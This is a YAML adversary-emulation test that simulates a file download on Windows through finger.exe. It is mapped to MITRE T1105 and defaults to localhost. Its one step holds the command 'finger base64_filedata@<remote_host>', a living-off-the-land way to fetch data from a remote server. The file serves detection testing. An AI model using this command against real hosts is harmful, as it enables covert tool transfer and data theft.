api_version: "2.0"
name: File download with finger.exe on Windows
description: |
    Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.
    Because this is being tested on the localhost, you should not be expecting a successful connection
    https://www.exploit-db.com/exploits/48815
    https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/
args:
    - name: remote_host
      type: string
      default: localhost
uuid: 5f507e45-8411-4f99-84e7-e38530c45d01
mitre:
    tactics:
        - 'TA0011: Command and Control'
    techniques:
        - 'T1105: Ingress Tool Transfer'
requirements:
    platforms:
        - os: windows
steps:
    - name: file-download-with-finger.exe-on-windows
      inline: |
        finger base64_filedata@{{.Args.remote_host}}
      executor: command_prompt
      cleanup:
        inline: ""
        executor: command_prompt
